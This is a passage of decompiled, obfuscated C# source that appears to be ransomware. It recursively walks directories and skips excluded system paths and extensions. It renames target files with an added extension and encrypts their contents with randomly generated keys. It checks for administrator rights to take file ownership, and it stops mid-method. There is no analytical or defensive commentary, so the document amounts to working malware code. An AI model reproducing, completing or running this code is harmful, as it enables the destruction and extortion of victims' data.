using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using iDURBOBwZUYAa;
using uxJZpPHZaFNzux;

namespace wDtIYaxdpawEu;

internal sealed class XudtxnGtRBJeB
{
	public sealed class lfFHEFlmfCqW
	{
		private static StringCollection UOJHfBFssXrY;

		private static List<string> IHERLZpUYbiWtQbI;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107349432));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107349459)) && !text.ToLower().Contains(getString_0(107349406)) && !text.ToLower().Contains(getString_0(107400832)) && !text.ToLower().Contains(getString_0(107400851)) && !text.ToLower().Contains(getString_0(107349425)) && !text.ToLower().Contains(getString_0(107401183)) && !text.ToLower().Contains(getString_0(107401124)) && !text.ToLower().Contains(getString_0(107401139)) && !text.ToLower().Contains(getString_0(107401090)) && !text.ToLower().Contains(getString_0(107401105)) && !text.ToLower().Contains(getString_0(107400559)) && !text.ToLower().Contains(getString_0(107400510)) && !text.ToLower().Contains(getString_0(107400525)) && !text.ToLower().Contains(getString_0(107400480)) && !text.ToLower().Contains(getString_0(107400491)) && !text.ToLower().Contains(getString_0(107400446)) && !text.ToLower().Contains(getString_0(107400465)) && !text.ToLower().Contains(getString_0(107400416)) && !text.ToLower().Contains(getString_0(107400431)) && !text.Contains(jGDSNxQzvqSx(getString_0(107400382))) && !text.Contains(getString_0(107400357)) && !text.Contains(getString_0(107400344)) && !text.EndsWith(getString_0(107395213)) && !text.EndsWith(getString_0(107400319)) && !text.EndsWith(getString_0(107400314)) && !text.EndsWith(getString_0(107400341)) && !text.EndsWith(getString_0(107400336)) && !text.ToLower().Contains(getString_0(107400331)) && !text.ToLower().Contains(COjZSLMnxffln))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nPUtTAwIhKI) * 1024.0 * 1024.0 && CoRisaOZQor == getString_0(107396779))
							{
								IHERLZpUYbiWtQbI.Add(text);
							}
							else if (File.Exists(text) && CoRisaOZQor == getString_0(107397036))
							{
								IHERLZpUYbiWtQbI.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return IHERLZpUYbiWtQbI;
		}

		static lfFHEFlmfCqW()
		{
			Strings.CreateGetStringDelegate(typeof(lfFHEFlmfCqW));
			UOJHfBFssXrY = new StringCollection();
			IHERLZpUYbiWtQbI = new List<string>();
		}
	}

	private sealed class GLfKfCJiKTIW
	{
		public string gvllsCCLJzdL;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == gvllsCCLJzdL;
		}
	}

	private sealed class CvtvsehZvVox
	{
		public string OfutQEOgrcWV;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(gcVeDsTCahqU);
			uneznyCLJqjxYvh.Add(getString_0(107400744) + OfutQEOgrcWV + getString_0(107397152) + (char)int_0 + getString_0(107349379));
			try
			{
				if (RxwgNpmsCUXw)
				{
					Console.WriteLine(getString_0(107400744) + OfutQEOgrcWV + getString_0(107397152) + (char)int_0 + getString_0(107349379));
				}
			}
			catch
			{
			}
		}

		static CvtvsehZvVox()
		{
			Strings.CreateGetStringDelegate(typeof(CvtvsehZvVox));
		}
	}

	private sealed class PbhoBWPuGhtGLm
	{
		public string RFtwrSGCcXR;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == RFtwrSGCcXR;
		}
	}

	private sealed class nmLGDsygJvrP
	{
		private sealed class cfAeuBOBEL
		{
			public nmLGDsygJvrP MBRxLCUcDRcQHo;

			public string VdTMxUweOcfiCauJn;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ZTPWQqzCqHBzuGb(WindowsIdentity.GetCurrent().Name, VdTMxUweOcfiCauJn);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				oyDgxyyJbvv(VdTMxUweOcfiCauJn, MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, MBRxLCUcDRcQHo.BiToJaAkWyjSw, MBRxLCUcDRcQHo.TsUefJDxWOuiS, MBRxLCUcDRcQHo.DTBKtELBieK);
			}
		}

		public string[] ebJNjDLXrhXbmH;

		public string[] TsUefJDxWOuiS;

		public string DTBKtELBieK;

		public string BiToJaAkWyjSw;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			cfAeuBOBEL CS_0024_003C_003E8__locals0 = new cfAeuBOBEL();
			CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo = this;
			CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn = string_0;
			if (ZdPTJTivRQPn && !yoVntBnyjeiaCWdn().Contains(getString_0(107397827)) && !yoVntBnyjeiaCWdn().Contains(getString_0(107398267)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ZTPWQqzCqHBzuGb(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CYtyMsjHbrwM == getString_0(107396788))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					oyDgxyyJbvv(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.DTBKtELBieK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				oyDgxyyJbvv(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, ebJNjDLXrhXbmH, BiToJaAkWyjSw, TsUefJDxWOuiS, DTBKtELBieK);
			}
		}

		static nmLGDsygJvrP()
		{
			Strings.CreateGetStringDelegate(typeof(nmLGDsygJvrP));
		}
	}

	private sealed class dOYydSKoLzIp
	{
		private sealed class nnITftDnrHBk
		{
			public dOYydSKoLzIp EqCJrbOGYCEo;

			public string BmoNJexcODDCT;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (BmoNJexcODDCT.ToLower().EndsWith(item + EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == getString_0(107396799))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(BmoNJexcODDCT).Length)
						{
							try
							{
								mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401552), getString_0(107401547), getString_0(107401566), BmoNJexcODDCT);
							}
							catch
							{
							}
						}
					}
					else if (BmoNJexcODDCT.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397056))
					{
						try
						{
							mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401552), getString_0(107401547), getString_0(107401566), BmoNJexcODDCT);
						}
						catch
						{
						}
					}
				}
			}

			static nnITftDnrHBk()
			{
				Strings.CreateGetStringDelegate(typeof(nnITftDnrHBk));
			}
		}

		private sealed class lMWNgthKPX
		{
			public dOYydSKoLzIp EqCJrbOGYCEo;

			public string hGfHXtUEXE;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (hGfHXtUEXE.ToLower().EndsWith(item + EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == getString_0(107396802))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(hGfHXtUEXE).Length)
						{
							try
							{
								mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401555), getString_0(107401550), getString_0(107401569), hGfHXtUEXE);
							}
							catch
							{
							}
						}
					}
					else if (hGfHXtUEXE.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397059))
					{
						try
						{
							mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401555), getString_0(107401550), getString_0(107401569), hGfHXtUEXE);
						}
						catch
						{
						}
					}
				}
			}

			static lMWNgthKPX()
			{
				Strings.CreateGetStringDelegate(typeof(lMWNgthKPX));
			}
		}

		public List<string> mKFRqpeTOqw;

		public List<string> mBwKTyYUMnTK;

		public string EonUYJCKfDwF;

		public string[] qEiHtzqbfmL;

		public string QsejQwxWKSqe;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			nnITftDnrHBk CS_0024_003C_003E8__locals0;
			foreach (string item in mBwKTyYUMnTK)
			{
				if (item.Contains(getString_0(107400956)) || item.Contains(getString_0(107400931)) || item.Contains(getString_0(107400898)) || item.ToLower().Contains(getString_0(107400849)) || item.ToLower().Contains(getString_0(107400868)) || item.Contains(getString_0(107401323)) || item.Contains(getString_0(107401302)) || item.ToLower().Contains(getString_0(107401289)) || item.ToLower().Contains(getString_0(107401308)) || item.ToLower().Contains(getString_0(107401239)) || item.ToLower().Contains(getString_0(107401230)) || item.ToLower().Contains(getString_0(107401245)) || item.ToLower().Contains(getString_0(107401219)) || item.ToLower().Contains(getString_0(107401166)) || item.Contains(getString_0(107401141)) || item.Contains(getString_0(107401156)) || item.Contains(getString_0(107401107)) || item.Contains(getString_0(107401122)) || item.Contains(getString_0(107400561)) || item.Contains(getString_0(107400576)) || item.Contains(getString_0(107400527)) || item.Contains(getString_0(107400542)) || item.Contains(getString_0(107400497)) || item.Contains(getString_0(107400508)) || item.ToLower().Contains(getString_0(107400463)) || item.ToLower().Contains(getString_0(107400482)) || item.ToLower().Contains(getString_0(107400433)) || item.ToLower().Contains(getString_0(107400448)) || item.Contains(jGDSNxQzvqSx(getString_0(107400399))) || item.Contains(getString_0(107400374)) || item.Contains(getString_0(107397161)) || item.Contains(getString_0(107400361)) || item.EndsWith(EonUYJCKfDwF) || item.EndsWith(getString_0(107400336)) || item.EndsWith(getString_0(107400331)) || item.EndsWith(getString_0(107400358)) || item.EndsWith(getString_0(107400353)) || item.Contains(getString_0(107400348)) || item.Contains(COjZSLMnxffln) || item.Contains(ndioqUCcjeEwRygxn) || item.Contains(zSigBrcrKLvB))
				{
					continue;
				}
				if (qEiHtzqbfmL.Length != 0)
				{
					string[] array = qEiHtzqbfmL;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e93;
					}
				}
				try
				{
					if (item.EndsWith(EonUYJCKfDwF))
					{
						goto IL_0e93;
					}
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				if (!item.EndsWith(string_0) || fQuiHGzOTAlx.Contains(item))
				{
					continue;
				}
				if (FiFLjMAxemfbt == getString_0(107396796))
				{
					try
					{
						if (ZLSBErccDQjOJ.DcKeziOuuW(item))
						{
							ZLSBErccDQjOJ.LJaTPEFDEMKOys(item);
						}
					}
					catch
					{
					}
				}
				fQuiHGzOTAlx.Add(item);
				if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
				{
					kEshrQncftX.Add(Path.GetDirectoryName(item));
				}
				uExGuCdAfUHFL(item);
				try
				{
					new efPnRHzmkfdXQE().lNahgQsJZubULu(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RxwgNpmsCUXw)
							{
								Console.WriteLine(getString_0(107349388) + item + getString_0(107348863) + new FileInfo(item).Length + getString_0(107348810));
								Console.WriteLine(getString_0(107348833));
							}
						}
						catch
						{
						}
						wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107348728)), getString_0(107400744) + item + getString_0(107400744) + jGDSNxQzvqSx(getString_0(107348703)) + getString_0(107400744) + Environment.UserName + getString_0(107400744) + jGDSNxQzvqSx(getString_0(107348654)));
					}
				}
				catch (Exception ex2)
				{
					if (SBPYnaSzKyFP)
					{
						try
						{
							File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + item + getString_0(107348629) + ex2.Message + getString_0(107396563));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + item + getString_0(107349092) + ex4.Message + getString_0(107396563));
							}
							catch (Exception)
							{
							}
						}
						PuPUesizAwkkz++;
						goto end_IL_0716;
					}
					if (eUAtnXtzwCVQtt == getString_0(107396796) && new FileInfo(item).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 && !mKFRqpeTOqw.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new nnITftDnrHBk();
						CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = this;
						try
						{
							if (EonUYJCKfDwF != getString_0(107398221))
							{
								if (lHJbFcHZdNnC)
								{
									EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
								}
								File.Move(item, item + EonUYJCKfDwF);
							}
						}
						catch (Exception ex6)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + item + getString_0(107349031) + ex6.Message + getString_0(107396563));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.BmoNJexcODDCT = getString_0(107401500);
						if (EonUYJCKfDwF != getString_0(107398221))
						{
							CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item + EonUYJCKfDwF;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item;
						}
						if (cGbDMszYvGe == getString_0(107396796))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in UaltDtqfmMVTAX)
								{
									if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == nnITftDnrHBk.getString_0(107396799))
									{
										if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BmoNJexcODDCT).Length)
										{
											try
											{
												mzYnDQcPQMD.ubBkhifeJCfa(nnITftDnrHBk.getString_0(107401552), nnITftDnrHBk.getString_0(107401547), nnITftDnrHBk.getString_0(107401566), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2) && cGDFQVDbXvzo == nnITftDnrHBk.getString_0(107397056))
									{
										try
										{
											mzYnDQcPQMD.ubBkhifeJCfa(nnITftDnrHBk.getString_0(107401552), nnITftDnrHBk.getString_0(107401547), nnITftDnrHBk.getString_0(107401566), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = fDzYxdGrlFct.LiytReEiZfhPA(32);
						string text2 = getString_0(107401500);
						text2 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : getString_0(107401500));
						string s = EURLmwFlibc.RjcOjZuEiYhKh(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (PurCmZibxBamv == getString_0(107397053))
						{
							byte[] array2 = null;
							byte[] byte_ = TplgMgKkTztrkdI.GDREwDOvqQ(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
							if (TplgMgKkTztrkdI.txaKUWpwgCrrkU(NviomBsLdCW: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), lswqspBeUzjGi: CS_0024_003C_003E8__locals0.BmoNJexcODDCT, AftuALoSYuJQ: bytes))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!IflXfWBKZN)
						{
							if (ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + EonUYJCKfDwF, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (lHJbFcHZdNnC)
					{
						EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
					}
					string text3 = fDzYxdGrlFct.LiytReEiZfhPA(32);
					string text4 = getString_0(107401500);
					text4 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : getString_0(107401500));
					string s2 = EURLmwFlibc.RjcOjZuEiYhKh(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (EonUYJCKfDwF != getString_0(107398221))
					{
						if (!yNTMpjtZXpajKX)
						{
							if (!IflXfWBKZN)
							{
								iZHZdbWaVjfuoZyn(item, item + EonUYJCKfDwF, dZNuvPCEnaSnNI);
							}
							else
							{
								iZHZdbWaVjfuoZyn(item, item + EonUYJCKfDwF, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!IflXfWBKZN)
								{
									cpHiazSZzHHd(item, item + EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
								}
								else
								{
									cpHiazSZzHHd(item, item + EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + item + getString_0(107398239) + ex11.Message + getString_0(107396563));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								try
								{
									File.Move(item + EonUYJCKfDwF, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!yNTMpjtZXpajKX)
					{
						if (!IflXfWBKZN)
						{
							iZHZdbWaVjfuoZyn(item, item + getString_0(107398216), dZNuvPCEnaSnNI);
						}
						else
						{
							iZHZdbWaVjfuoZyn(item, item + getString_0(107398216), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!IflXfWBKZN)
							{
								cpHiazSZzHHd(item, item, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
							}
							else
							{
								cpHiazSZzHHd(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + item + getString_0(107398239) + ex14.Message + getString_0(107396563));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_0716;
						}
					}
					if (IflXfWBKZN)
					{
						if (EonUYJCKfDwF != getString_0(107398221))
						{
							vtJKNupXtRpM(item + EonUYJCKfDwF, bytes2);
						}
						else
						{
							vtJKNupXtRpM(item, bytes2);
						}
					}
					goto IL_0e93;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				continue;
				IL_0e93:
				mBwKTyYUMnTK.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			lMWNgthKPX CS_0024_003C_003E8__locals0 = new lMWNgthKPX();
			CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = this;
			CS_0024_003C_003E8__locals0.hGfHXtUEXE = string_0;
			if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400956)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400931)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400898)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400849)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400868)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401323)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401302)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401289)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401308)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401239)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401230)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401245)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401219)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107401166)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401141)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401156)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401107)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107401122)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400561)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400576)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400527)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400542)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400497)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400508)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400463)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400482)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400433)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(getString_0(107400448)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(jGDSNxQzvqSx(getString_0(107400399))) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400374)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107397161)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400361)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(EonUYJCKfDwF) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400336)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400331)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400358)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(getString_0(107400353)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(getString_0(107400348)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(COjZSLMnxffln) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(ndioqUCcjeEwRygxn) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(zSigBrcrKLvB))
			{
				if (qEiHtzqbfmL.Length != 0)
				{
					string[] array = qEiHtzqbfmL;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(EonUYJCKfDwF))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!fQuiHGzOTAlx.Contains(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
				{
					if (FiFLjMAxemfbt == getString_0(107396796))
					{
						try
						{
							if (ZLSBErccDQjOJ.DcKeziOuuW(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
							{
								ZLSBErccDQjOJ.LJaTPEFDEMKOys(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
							}
						}
						catch
						{
						}
					}
					fQuiHGzOTAlx.Add(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					if (!kEshrQncftX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE)))
					{
						kEshrQncftX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE));
					}
					uExGuCdAfUHFL(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					try
					{
						new efPnRHzmkfdXQE().lNahgQsJZubULu(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGfHXtUEXE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (RxwgNpmsCUXw)
								{
									Console.WriteLine(getString_0(107349388) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107348863) + new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length + getString_0(107348810));
									Console.WriteLine(getString_0(107348833));
								}
							}
							catch
							{
							}
							wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107348728)), getString_0(107400744) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107400744) + jGDSNxQzvqSx(getString_0(107348703)) + getString_0(107400744) + Environment.UserName + getString_0(107400744) + jGDSNxQzvqSx(getString_0(107348654)));
						}
					}
					catch (Exception ex2)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107348629) + ex2.Message + getString_0(107396563));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107349092) + ex4.Message + getString_0(107396563));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_085c_2;
						}
						if (eUAtnXtzwCVQtt == getString_0(107396796) && new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024)
						{
							try
							{
								if (EonUYJCKfDwF != getString_0(107398221))
								{
									if (lHJbFcHZdNnC)
									{
										EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF);
								}
							}
							catch (Exception ex6)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
